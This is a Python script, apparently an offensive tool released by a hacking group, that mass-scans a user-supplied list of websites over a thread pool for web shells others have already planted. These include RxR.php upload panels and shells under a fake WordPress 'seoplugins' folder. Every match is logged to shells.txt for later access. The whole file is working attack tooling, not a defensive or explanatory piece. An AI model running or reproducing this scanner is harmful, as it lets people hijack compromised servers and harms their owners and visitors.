import time,requests,sys,random,re,string,concurrent.futures,os
from colorama import Fore
from colorama import init
fr  =   Fore.RED
fg  =   Fore.GREEN
os.system('cls' if os.name == 'nt' else 'clear')

requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
banner = '''
 \u001b[36m
    _______  ______     ____  ____  ______
   / ____/ |/ / __ \   / __ )/ __ \/_  __/
  / /    |   / /_/ /  / __  / / / / / /
 / /___ /   |\__, /  / /_/ / /_/ / / /
 \____//_/|_/____/  /_____/\____/ /_/
                      Wp Scanner
  \u001b[32mDEVELOPED BY TEAM Garsec \033[0m
  Cracked By GarudaSecurity 
  Our Official Channel : https://t.me/garudasec4
'''
def animated(text):
    for x in text:
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.005)
def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site

def exploit_1(url):
 
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 1 --> ' + url + ' \u001b[32m[Succefully]\033[0m')
                open('shells.txt', 'a').write(url + '/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 1 --> ' + url + ' \u001b[32m[Succefully]\033[0m')
                    open('shells.txt', 'a').write(url + '/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 1 --> ' + url + ' \u001b[31m[Failed]\033[0m')
    except:
        print ('[#] Dead --> ' + url ) 

def exploit_2(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/cgi-bin/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 2 --> ' + url + ' \u001b[32m[Succefully]\033[0m')
                open('shells.txt', 'a').write(url + '/cgi-bin/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cgi-bin/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 2 --> ' + url + ' \u001b[32m[Succefully]\033[0m')
                    open('shells.txt', 'a').write(url + '/cgi-bin/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 2 --> ' + url  + ' \u001b[31m[Failed]\033[0m')
    except:
        print ('[#] Dead --> ' + url)
#
def exploit_3(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/blog/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 3 --> ' + url + ' \u001b[32m[Succefully]\033[0m')
                open('shells.txt', 'a').write(url + '/blog/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/blog/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 3 --> ' + url + ' \u001b[32m[Succefully]\033[0m') 
                    open('shells.txt', 'a').write(url + '/blog/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 3 --> ' + url + ' \u001b[31m[Failed]\033[0m')
    except:
        print ('[#] Dead --> ' + url ) 
#
def exploit_4(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/cgi-bin/mt/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 4 --> ' + url + ' \u001b[32m[Succefully]\033[0m')
                open('shells.txt', 'a').write(url + '/cgi-bin/mt/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cgi-bin/mt/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 4 --> ' + url + ' \u001b[32m[Succefully]\033[0m')
                    open('shells.txt', 'a').write(url + '/cgi-bin/mt/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 4 --> ' + url + ' \u001b[31m[Failed]\033[0m')
    except:
        print ('\033[0;31m[#] Dead --> ' + url)  
#
def exploit_5(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/cms/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 5 --> ' + url + ' \u001b[32m[Succefully]\033[0m') 
                open('shells.txt', 'a').write(url + '/cms/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cms/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 5 --> ' + url + ' \u001b[32m[Succefully]\033[0m')
                    open('shells.txt', 'a').write(url + '/cms/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 5 --> ' + url + ' \u001b[31m[Failed]\033[0m')
    except:
        print ('[#] Dead --> ' + url) 
#
def exploit_6(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/mtos/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 6 --> ' + url + ' \u001b[32m[Succefully]\033[0m') 
                open('shells.txt', 'a').write(url + '/mtos/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/mtos/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 6 --> ' + url + ' \u001b[32m[Succefully]\033[0m')
                    open('shells.txt', 'a').write(url + '/mtos/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 6 --> ' + url + ' \u001b[31m[Failed]\033[0m')
    except:
        print ('[#] Dead --> ' + url ) 
#
def exploit_7(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/mt/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 7 --> ' + url + ' \u001b[32m[Succefully]\033[0m')
                open('shells.txt', 'a').write(url + '/mt/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/mt/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 7 --> ' + url + ' \u001b[32m[Succefully]\033[0m')
                    open('shells.txt', 'a').write(url + '/mt/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 7 --> ' + url + ' \u001b[31m[Failed]\033[0m')
    except:
        print ('[#] Dead --> ' + url ) 
#
def exploit_8(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/MT/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 8 --> ' + url + ' \u001b[32m[Succefully]\033[0m')
                open('shells.txt', 'a').write(url + '/MT/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/MT/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 8 --> ' + url + ' \u001b[32m[Succefully]\033[0m')
                    open('shells.txt', 'a').write(url + '/MT/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 8 --> ' + url + ' \u001b[31m[Failed]\033[0m')
    except:
        print ('[#] Dead --> ' + url ) 
#
def exploit_9(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/seoplugins/db.php?u',headers=headers, allow_redirects=True,timeout=15)
        if ('<input name="_upl" type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8")):
                print (' [#] Exploit 9 --> ' + url + ' \u001b[32m[Succefully]\033[0m')
                open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/db.php?u\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/seoplugins/db.php?u',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input name="_upl" type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 9 --> ' + url + ' \u001b[32m[Succefully]\033[0m')
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/db.php?u\n')
            else:
                print ('[#] Exploit 9 --> ' + url + ' \u001b[31m[Failed]\033[0m')
    except:
        print ('[#] Dead --> ' + url ) 
#

def exploit_10(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ("//0x5a455553.github.io/MARIJUANA/icon.png" in check.content.decode("utf-8")):
                print (' [#] Exploit 10 --> ' + url + ' \u001b[32m[Succefully]\033[0m')
                open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "//0x5a455553.github.io/MARIJUANA/icon.png" in check.content.decode("utf-8"):
                    print (' [#] Exploit 10 --> ' + url + ' \u001b[32m[Succefully]\033[0m')
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
            else:
                print ('[#] Exploit 10 --> ' + url + ' \u001b[31m[Failed]\033[0m')
    except:
        print ('[#] Dead --> ' + url ) 
#






def run_code(site):
    
    
    try:
        exploit_1(site)
        exploit_2(site)
        exploit_3(site)
        exploit_4(site)
        exploit_5(site)
        exploit_6(site)
        exploit_7(site)
        exploit_8(site)
        exploit_9(site)
        exploit_10(site)
    except:
        print("fuck")
    
print(banner)
filename = input("\033[0m[#]ENTER FILE NAME: ")
# file = open(filename).read().split()
file = open(filename, encoding="utf-8").read().split()

myfile = set(file)
thread = int(input("[#]Threads: "))

# Create a thread pool with a maximum of 10 threads
with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
    # Submit each URL to the thread pool
    futures = [executor.submit(run_code, site) for site in myfile]

    # Wait for all threads to complete
    concurrent.futures.wait(futures)